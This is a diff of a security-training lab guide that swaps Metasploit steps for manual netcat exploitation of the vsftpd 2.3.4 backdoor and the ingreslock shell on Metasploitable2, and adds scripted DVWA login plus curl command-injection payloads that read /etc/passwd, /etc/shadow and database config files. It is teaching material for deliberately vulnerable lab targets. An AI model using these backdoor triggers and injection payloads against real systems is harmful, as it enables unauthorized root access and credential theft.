@@ -1,12 +1,12 @@
-# Lab 4: Exploitation with Metasploit
+# Lab 4: Exploitation Techniques
 
 **Duration:** ~40 minutes  
 **Difficulty:** Intermediate  
-**Tools:** Metasploit Framework (msfconsole)
+**Tools:** Metasploit Framework, netcat, nmap
 
 ## 🎯 Objective
 
-Use the Metasploit Framework to exploit a known vulnerability on Metasploitable2, gain a shell, and explore post-exploitation. Then try command injection on DVWA.
+Learn the exploitation lifecycle: use Metasploit to research vulnerabilities, then exploit known backdoors on Metasploitable2 to gain root shells. Finally, try command injection on DVWA.
 
 ---
 
@@ -17,6 +17,8 @@ Use the Metasploit Framework to exploit a known vulnerability on Metasploitable2
 - **Payloads** — code that runs after successful exploitation
 - **Post-exploitation modules** — for gathering data after gaining access
 
+Real-world attackers often combine automated tools like Metasploit with **manual exploitation** using basic tools like `netcat`. This lab teaches both approaches.
+
 ### The Exploit Lifecycle:
 ```
 Recon → Vulnerability Discovery → Exploit Selection → Exploitation → Post-Exploitation
@@ -25,9 +27,9 @@ Recon → Vulnerability Discovery → Exploit Selection → Exploitation → Pos
 
 ---
 
-## Part A: Exploiting vsftpd 2.3.4 Backdoor
+## Part A: Researching & Exploiting Backdoors
 
-In Lab 3, you discovered that Metasploitable runs **vsftpd 2.3.4**, which has a known backdoor (CVE-2011-2523). Let's exploit it.
+In Lab 3, you discovered that Metasploitable runs several vulnerable services. Let's research them in Metasploit, then exploit them.
 
 ### Step 1: Launch Metasploit
 
@@ -36,12 +38,14 @@ docker exec -it kali bash
 msfconsole
 ```
 
-Wait for the banner to load (this takes 15-30 seconds). You'll see:
+Wait for the banner to load (this takes 60-90 seconds in Docker). You'll see:
 ```
 msf6 >
 ```
 
-### Step 2: Search for the Exploit
+### Step 2: Research with Metasploit — Search for Exploits
+
+Let's look up the vsftpd 2.3.4 vulnerability we found in Lab 3:
 
 ```
 msf6 > search vsftpd
@@ -56,18 +60,14 @@ Matching Modules
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
 ```
 
-### Step 3: Select the Exploit
+### Step 3: Examine the Module
 
 ```
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 exploit(...) > info
 ```
 
-Your prompt changes to:
-```
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
-```
-
-### Step 4: View Required Options
+Read the description — this was a **supply chain attack**: someone inserted a backdoor into the vsftpd source code. When a user logs in with a username ending in `:)`, it opens a root shell on port 6200.
 
 ```
 msf6 exploit(...) > show options
@@ -81,31 +81,60 @@ Module options:
    RPORT   21               yes       The target port
 ```
 
-### Step 5: Set the Target
-
+Now go back to the main prompt:
 ```
-msf6 exploit(...) > set RHOSTS 10.10.10.30
-```
-
-### Step 6: Run the Exploit!
-
-```
-msf6 exploit(...) > run
+msf6 exploit(...) > back
 ```
 
-If successful, you'll see:
-```
-[*] 10.10.10.30:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 10.10.10.30:21 - USER: 331 Please specify the password.
-[+] 10.10.10.30:21 - Backdoor service has been spawned, handling...
-[+] 10.10.10.30:21 - UID: uid=0(root) gid=0(root)
-[*] Found shell.
-[*] Command shell session 1 opened
+### Step 4: Exploit vsftpd Manually with Netcat
+
+The vsftpd 2.3.4 backdoor is simple: send a username containing `:)` and it opens a root shell on port 6200. Let's trigger it manually:
+
+**Terminal 1** — Trigger the backdoor:
+```bash
+# Send the backdoor trigger (username with smiley face)
+printf "USER backdoor:)\r\nPASS anything\r\n" | nc -w 5 10.10.10.30 21
 ```
 
-### 🎉 You now have a ROOT shell on the target!
+You'll see:
+```
+220 (vsFTPd 2.3.4)
+331 Please specify the password.
+```
 
-### Step 7: Explore the Compromised System
+**Terminal 2** (open a second shell into Kali with `docker exec -it kali bash`):
+```bash
+# Connect to the backdoor shell on port 6200
+nc 10.10.10.30 6200
+```
+
+Type commands — you now have a **root shell**:
+```bash
+whoami
+# Output: root
+
+id
+# Output: uid=0(root) gid=0(root) groups=0(root)
+
+cat /etc/shadow | head -5
+```
+
+Press `Ctrl+C` to exit.
+
+### Step 5: Exploit the Ingreslock Backdoor
+
+Metasploitable also has a root shell listening on port 1524 (the "ingreslock" backdoor). Connect directly:
+
+```bash
+nc 10.10.10.30 1524
+```
+
+You'll get a root prompt immediately:
+```
+root@metasploitable:/#
+```
+
+### Step 6: Explore the Compromised System
 
 You're now typing commands **on the Metasploitable server**, not on Kali:
 
@@ -136,16 +165,13 @@ ifconfig
 2. How many user accounts exist on the system? (`wc -l /etc/passwd`)
 3. Can you find any interesting files in user home directories?
 
-### Step 8: Exit the Shell
+### Step 7: Exit the Shell
 
 ```bash
 exit
 ```
 
-Then back in Metasploit:
-```
-msf6 exploit(...) > back
-```
+> **💡 Key Takeaway:** You didn't need a complex exploit framework — just `netcat` and knowledge of the vulnerability. This is how many real attacks work: known vulnerabilities + simple tools = full compromise.
 
 ---
 
@@ -153,28 +179,49 @@ msf6 exploit(...) > back
 
 Now let's exploit a web application vulnerability manually.
 
-### Step 9: Command Injection via curl
+### Step 8: Authenticate to DVWA
 
 DVWA's Command Injection page lets you ping an IP address. But it doesn't sanitize input properly.
 
-First, let's do it the intended way from Kali (in a new terminal or after exiting msfconsole):
+DVWA's database is already initialized automatically when the lab starts (`make start`). You just need to **log in** and save the session cookie:
 
 ```bash
-# Normal request — ping a host
-curl -s -b "security=low; PHPSESSID=test" \
-  "http://10.10.10.20/vulnerabilities/exec/" \
-  --data-urlencode "ip=10.10.10.10&Submit=Submit"
+# === DVWA: Authenticate and save session ===
+COOKIE_JAR=/tmp/dvwa.cookies
+rm -f $COOKIE_JAR
+
+# Log in (default creds: admin / password)
+LOGIN_PAGE=$(curl -s -c $COOKIE_JAR "http://10.10.10.20/login.php")
+TOKEN=$(echo "$LOGIN_PAGE" | grep -oP 'user_token. value=.\K[a-f0-9]+')
+curl -s -b $COOKIE_JAR -c $COOKIE_JAR -L \
+  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
+  "http://10.10.10.20/login.php" -o /dev/null
+
+echo "DVWA session saved to $COOKIE_JAR"
 ```
 
-Now, inject a command:
+> **Why this matters:** DVWA uses session cookies and CSRF tokens. Without a valid authenticated session, requests redirect to the login page and return nothing useful. This is realistic — most web apps require authentication before you can reach vulnerable pages.
+
+### Step 9: Command Injection via curl
+
+Now use the saved session cookie to inject commands. The `;` character ends the `ping` command and starts a new one:
+
 ```bash
-# Command injection — append a second command
-curl -s -b "security=low; PHPSESSID=test" \
+# Normal request — just ping
+curl -s -b $COOKIE_JAR \
   "http://10.10.10.20/vulnerabilities/exec/" \
-  --data-urlencode "ip=10.10.10.10;whoami&Submit=Submit"
+  -d "ip=127.0.0.1&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
 ```
 
-> **Note:** You may need to log into DVWA first via the browser and get a valid `PHPSESSID` cookie. Alternatively, use DVWA directly from a browser on your host machine.
+Now inject a command after the IP:
+```bash
+# Command injection — whoami
+curl -s -b $COOKIE_JAR \
+  "http://10.10.10.20/vulnerabilities/exec/" \
+  -d "ip=127.0.0.1%3Bwhoami&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
+```
+
+You should see the ping output followed by `www-data` — that's the web server user. The `;` (URL-encoded as `%3B`) tells the shell to run `whoami` after the ping.
 
 ### Step 10: Try Increasingly Dangerous Commands
 
@@ -182,17 +229,27 @@ Each of these demonstrates what an attacker could do:
 
 ```bash
 # Read system files
-ip=10.10.10.10; cat /etc/passwd
-
-# List the web application files
-ip=10.10.10.10; ls -la /var/www/html/
-
-# View DVWA's database configuration
-ip=10.10.10.10; cat /var/www/html/config/config.inc.php
+curl -s -b $COOKIE_JAR \
+  "http://10.10.10.20/vulnerabilities/exec/" \
+  -d "ip=127.0.0.1%3Bcat+/etc/passwd&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
 
 # Check what user the web server runs as
-ip=10.10.10.10; id
+curl -s -b $COOKIE_JAR \
+  "http://10.10.10.20/vulnerabilities/exec/" \
+  -d "ip=127.0.0.1%3Bid&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
+
+# List the web application files
+curl -s -b $COOKIE_JAR \
+  "http://10.10.10.20/vulnerabilities/exec/" \
+  -d "ip=127.0.0.1%3Bls+-la+/var/www/html/&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
+
+# View DVWA's database configuration (credentials in plain text!)
+curl -s -b $COOKIE_JAR \
+  "http://10.10.10.20/vulnerabilities/exec/" \
+  -d "ip=127.0.0.1%3Bcat+/var/www/html/config/config.inc.php&Submit=Submit" | sed -n '/<pre>/,/<\/pre>/p'
 ```
+
+> **Tip:** The `sed` command extracts just the `<pre>` output block so you don't see the full HTML page. You can also try other command separators: `|` (pipe), `||` (OR), `&&` (AND).
 
 ### Why this is critical:
 In real applications, command injection can lead to:
@@ -208,7 +265,7 @@ In real applications, command injection can lead to:
 ### vsftpd Backdoor:
 - **Keep software updated** — this was a supply chain attack; the malicious code was in the official download
 - **Verify checksums** of downloaded software
-- **Monitor for unusual network connections**
+- **Monitor for unusual network connections** — a shell on port 6200 or 1524 should trigger alerts
 
 ### Command Injection:
 ```php
@@ -236,9 +293,11 @@ if (filter_var($ip, FILTER_VALIDATE_IP)) {
 
 | Skill | What you did |
 |-------|-------------|
-| Metasploit basics | `search`, `use`, `set`, `run` |
-| Remote exploitation | Gained root shell via vsftpd backdoor |
+| Metasploit research | `search`, `use`, `info`, `show options` |
+| Manual exploitation | Triggered vsftpd backdoor with netcat |
+| Backdoor access | Connected to ingreslock root shell on port 1524 |
 | Post-exploitation | Explored compromised system, read sensitive files |
+| Web app authentication | Set up DVWA session with CSRF tokens and cookies |
 | Web exploitation | Command injection via unsanitized input |
 | Defense understanding | Input validation, parameterization, least privilege |
 
